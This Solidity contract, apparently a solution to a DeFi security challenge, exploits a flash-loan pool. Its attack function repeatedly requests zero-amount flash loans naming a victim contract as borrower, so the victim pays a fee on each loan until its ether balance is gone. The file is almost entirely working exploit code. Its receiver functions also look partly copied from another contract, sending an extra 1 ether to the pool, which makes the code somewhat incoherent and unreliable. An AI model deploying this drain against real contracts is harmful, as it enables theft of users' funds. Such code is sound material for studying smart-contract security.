// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract AttackFlashLoanReceiver {
    error TRANSFER_FAILED();

    using Address for address payable;

    address payable private pool;

    constructor(address payable _poolAddress) {
        pool = _poolAddress;
    }

    function attack(address payable _victim) public {
        while (_victim.balance > 0) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    _victim,
                    0
                )
            );

            if (!success) revert TRANSFER_FAILED();
        }
    }

    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be pool");

        uint256 amountToBeRepaid = msg.value + fee;

        require(
            address(this).balance >= amountToBeRepaid,
            "Cannot borrow that much"
        );

        _executeActionDuringFlashLoan();

        // Return funds to pool
        pool.sendValue(amountToBeRepaid);
    }

    // Internal function where the funds received are used
    function _executeActionDuringFlashLoan() internal {
        // Send 1 ETH to the pool
        pool.sendValue(1 ether);
    }

    // Allow deposits of ETH
    receive() external payable {}
}
